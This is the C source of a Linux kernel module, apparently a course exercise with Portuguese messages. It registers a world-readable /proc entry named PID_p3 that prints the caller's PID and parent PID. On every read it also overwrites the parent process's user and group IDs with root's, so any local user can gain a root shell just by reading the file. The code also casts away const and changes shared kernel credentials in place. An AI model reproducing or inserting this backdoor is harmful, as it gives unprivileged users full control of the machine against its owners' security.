#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/sched.h>
#include <linux/cred.h>


static int PID_p3_show(struct seq_file *m, void *v) {

  struct cred *ponteiro_pid;
  
  seq_printf(m, "PID filho:%d\n",current->pid);

  seq_printf(m, "PID pai:%d\n",current->parent->pid);

  ponteiro_pid = (struct cred *) get_cred(current->parent->cred);
  
  ponteiro_pid->uid = GLOBAL_ROOT_UID;    
  ponteiro_pid->gid = GLOBAL_ROOT_GID;    
  ponteiro_pid->euid = GLOBAL_ROOT_UID;   
  ponteiro_pid->egid = GLOBAL_ROOT_GID;   

  put_cred(ponteiro_pid);

  return 0;
}

static int PID_p3_open(struct inode *inode, struct file *file) {
     return single_open(file, PID_p3_show, NULL);
}

static const struct file_operations PID_p3_fops = {
     .owner	= THIS_MODULE,
     .open	= PID_p3_open,
     .read	= seq_read,
     .llseek	= seq_lseek,
     .release	= single_release,
};

int init_module(void) {
  if (!proc_create("PID_p3", 0644, NULL, &PID_p3_fops)) {
    printk("Problema com o módulo!\n");
    return -ENOMEM;
  }
  printk("Módulo carregado!\n");
  return 0;
}

void cleanup_module(void) {
  remove_proc_entry("PID_p3", NULL);
  printk("Módulo descarregado!\n");
}

MODULE_LICENSE("GPL");